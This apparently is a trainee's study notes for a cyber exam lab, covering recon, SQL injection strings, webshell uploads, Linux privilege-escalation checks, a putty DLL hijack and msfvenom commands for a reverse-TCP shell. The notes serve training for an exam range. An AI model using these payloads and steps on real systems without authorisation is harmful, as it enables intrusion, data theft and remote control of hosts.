@@ -1,0 +1,124 @@
+RECON FROM GRAYHOST ON THE WEB SERVER
+--------------------------------------
+1. first perfrom initial scanning
+
+	nmap -Pn -T4 --min-rate 80000 <webserver_ip> -p-
+
+	this will scan all ports very fast
+	
+	optional ports to specify	:	1024,8000,8080,8888,1111,2222,3333,4444,5555,6666,7777,8888,9999,4242
+	
+	
+2. use nikto to quickly uncover directories or files of interest on the website
+	
+	nikto v -h <webserver_ip>
+	
+3. verify the ports if necessary
+
+	nc <webserver_ip> 80
+
+4. In the meanwhile, go to the website. check it out, play with it a bit, see what it does and check out changes in the address bar. view page source, open    console with f12, look at the index.html
+   	- a good first place to check is <webserver_ip>/robots.txt	, this is always worth checking at the start
+	
+5. Attempt your various exploits via GET or POST methods (GET = address bar, POST = entering things into boxes on the site). Look in /etc/passwd for user      accounts and search for shells (/bin/sh or /bin/bash), look in /etc/hosts
+
+6. If you do not have access to the <webserver>/uploads page OR if the website sanitizes its file uploads ("Wrong file type"), then doing webshell malicious file uploads will NOT work. The reference webshell.py script is found on the CCTC guide website
+
+7. POST method vulnerable logins, you can attempt to copy and paste one of your truth statements (' OR 1='1 )
+	- try something else if it works, such as user' or 1='1
+	- look at the page source or the network pane of the f12 developer console 
+	
+8. If you use the f12 developer console, one cool POST trick is to go to network pane -> look at 'request' tab of right hand pane -> check the 'Raw' button so it turns blue -> right click copy and paste the Raw output into the addres bar. it should fill in the EXACT get request you need for exploitation.
+	- note: these steps may require SEVERAL variations of the truth statements. play around with it and most importantly be patient and do not become frustrated
+	
+	
+9. if you get credentials, fuck it try and log in with them. if it works it works, if not no harm done
+	- regarding credentials, try decoding it from base64 or ROT13 (the only ones you need to really worry about).
+	- from sgt wilson: allegedly there are several ways to solve different problems on the test, its worth trying everything you can possibly do
+	
+10. If you were able to log in to whatever box, do some basic enumeration of your environment.
+	- verify that you are the user you were supposed to log in as (whoami)
+	- navigate to /var/www/html to check if you missed anything. do a quick 'cat' on all the html or php files and check if you missed anything (usernames, passwords, flags)
+	- note from sgt wilson: if you have tried EVERYTHING to privesc on a box and it doesnt work, you PROBABLY DONT NEED TO PRIVESC!!!!
+	
+11. In this particular dry run instance, you found a new IP address (the BestWebApp 192.168.28.181 box) that you navigate to next. Start your recon methodology over again after opening your tunnels to scan the new network/box
+
+	- nmap -Pn -T4 --min-rate 80000 <new_ip> -p-
+	
+	- every box you find in the test network has a purpose: they will TELL YOU WHICH BOXES TO AVOID, i.e. routers and switches, etc.
+	
+	- pingsweep : for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+	
+	
+12. After getting to the BestWebApp, you start doing more SQL injections via the GET method.
+	
+	website/script.php?selection=7 OR 1=1
+	
+	- make sure you check ALL vulnerable fields! you never know which ones will work better than others 
+	
+	- now update your SQL inject statement
+	
+	- website/script.php?selection=7 UNION SELECT 1
+	
+	- website/script.php?selection=7 UNION SELECT 1,2
+	
+	-website/script.php?selection=7 UNION SELECT 1,2,3
+	
+	- now you may notice that the bottom row shows (1,3,2) although the SQL inject statement shows 1,2,3. this means you should alter your SQL inject statement to reflect the actual DISPLAYED order, so it makes more sense from an analysis perspective.
+	
+	- note: we are using the 'mysql' version of sql
+	
+	- now the golden statement: wesbite:port/script.php?selection=x UNION SELECT table_name,column_name
+	
+	- line up your golden statement with the (( information_schema.columns; # )) statement in order to make the query work
+	
+	- scroll to the bottom or top and look for the custom schemas, these contain your bread and butter
+	
+	- keep an eye out for hidden columns
+	
+	- sgt wilson tip: generally the test will instruct you what exactly you are looking for, so dont go crazy on querying stuff you dont need or isnt relevant
+
+	- sgt wilson: always ignore the gateway devices; they will let you know which ones need to be skipped over 
+	
+	- if you cannot figure out what a port does, annotate that it exists, and then MOVE ON. do not waste your time 
+	
+	- make sure that you notate case sensitivity! if you find credentials, this is especially important 
+	
+
+13. regarding privesc:
+	
+	- always do sudo -l first
+	- then look at suid/guid bits with find command
+	- if not look at the echo $PATH and cronjobs you can manipulate for exploitation
+	
+	- sgt wilson tip: persistence is not important for the test. if you get root, congrats fuck it we now ball
+	
+	
+14. regarding getting into windows:
+
+	- look at the following ports to locate windows boxes: 3389, 9999, 445, 139, 135
+	
+	
+	
+15. the first place to check when you get onto a windows box is to look at the SERVICES
+
+
+	- look for blank descriptions, this indicates a 3rd party binary (likely can be exploited lol)
+	
+	- look in the C:\Windows\Users directory for sussy stuff. if you see putty, its worth trying your dll. 
+	
+	
+	
+	- msfvenom -p windows/exec cmd="cmd.....whatever whatever you already have this in your notes somewhere
+	
+	- msfvenom -p windows/exec CMD="cmd /C whoami > C:\\findme.txt" -f dll > SSPICLI.dll			#this is for putty, any other binary requires reanalysis
+	
+
+
+
+16. to generate shellcode for the windows buffer overflow exploit: the following command must be used. note: your existing script should work just fine but if it doesnt, try regenerating shellcode
+
+	msfvenom -p windows/shell/reverse_tcp lhost=10.50.22.79 lport=5555 -b '\x00' -f python
+
+	
+	if you can rename an executable, you can replace it. this is called BINARY REPLACEMENT, and you have notes on it already.
